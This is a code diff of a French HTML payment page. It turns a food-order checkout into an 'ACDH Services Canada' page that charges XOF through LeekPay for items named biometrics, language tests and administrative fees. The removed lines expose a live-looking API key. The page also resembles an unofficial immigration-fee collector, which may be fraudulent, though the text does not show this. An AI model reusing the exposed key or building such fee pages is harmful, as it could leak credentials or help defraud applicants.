@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Paiement MAFIRIDE</title>
+<title>Paiement ACDH</title>
 
 <style>
 body{
@@ -27,7 +27,7 @@ body{
 
 .logo{ width:120px; margin-bottom:10px; }
 
-select,input,button{
+select,button{
   width:100%;
   padding:12px;
   margin-top:10px;
@@ -37,6 +37,12 @@ button{
   background:#00bcd4;
   color:white;
   border:none;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+#amount{
+  margin-top:10px;
   font-weight:bold;
 }
 </style>
@@ -51,87 +57,50 @@ button{
 
 <img src="logo.png" class="logo">
 
-<h3>Paiement commande alimentaire</h3>
+<h3>Paiement ACDH Services Canada</h3>
 
-<!-- 🌍 PAYS -->
-<select id="country" onchange="updateAll()">
-  <option value="BEN">Bénin</option>
-  <option value="CIV">Côte d'Ivoire</option>
-  <option value="CMR">Cameroun</option>
-  <option value="COD">RDC</option>
-  <option value="GAB">Gabon</option>
-  <option value="SEN">Sénégal</option>
+<select id="service" onchange="updateAmount()">
+  <option value="150">1 - Demande biométrique - 150 USD</option>
+  <option value="140">2 - Test de langue - 140 USD</option>
+  <option value="230">3 - Droit administratif - 230 USD</option>
+  <option value="520">4 - Toutes les procédures - 520 USD</option>
 </select>
 
-<!-- 📡 OPERATEUR -->
-<select id="operator"></select>
-
-<!-- 📞 TELEPHONE -->
-<input id="phone">
-
-<!-- 💰 MONTANT -->
-<input id="amount" type="number" placeholder="Montant USD">
-
-<p id="result"></p>
+<p id="amount"></p>
 
 <button onclick="payer()">Payer</button>
+
+<p style="font-size:12px; margin-top:10px;">
+Après avoir cliqué sur "Payer", vous serez redirigé vers une page sécurisée pour confirmer votre paiement.
+</p>
 
 </div>
 
 <script>
 
-// 🌍 CONFIG
-const data = {
-  BEN:{prefix:"229",currency:"XOF",operators:["MTN","MOOV"]},
-  CIV:{prefix:"225",currency:"XOF",operators:["MTN","ORANGE"]},
-  CMR:{prefix:"237",currency:"XAF",operators:["MTN"]},
-  COD:{prefix:"243",currency:"CDF",operators:["AIRTEL","ORANGE","VODACOM"]},
-  GAB:{prefix:"241",currency:"XAF",operators:["AIRTEL"]},
-  SEN:{prefix:"221",currency:"XOF",operators:["ORANGE","FREE"]}
-};
+const rate = 600; // conversion USD → XOF
 
-const rate = 600;
+function updateAmount(){
+  let usd = parseFloat(service.value);
+  let xof = Math.round(usd * rate);
 
-// 🔄 UPDATE
-function updateAll(){
-
-  const c = country.value;
-
-  // opérateurs
-  operator.innerHTML="";
-  data[c].operators.forEach(o=>{
-    let op=document.createElement("option");
-    op.textContent=o;
-    operator.appendChild(op);
-  });
-
-  // prefix
-  phone.value = data[c].prefix;
+  amount.innerText = "Montant à payer : " + xof + " XOF";
 }
 
-updateAll();
-
-// 💳 PAIEMENT
 function payer(){
 
-  let usd = parseFloat(amount.value);
-
-  if(!usd){
-    alert("Entrer un montant");
-    return;
-  }
-
-  let local = Math.round(usd * rate);
-
-  result.innerText = "Montant: " + local + " " + data[country.value].currency;
+  let usd = parseFloat(service.value);
+  let xof = Math.round(usd * rate);
 
   LeekPay.checkout({
-    amount: local,
-    currency: data[country.value].currency,
-    apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK"
+    amount: xof,
+    currency: "XOF",
+    apiKey: "pk_live_TA_CLE"
   });
 
 }
+
+updateAmount();
 
 </script>
 
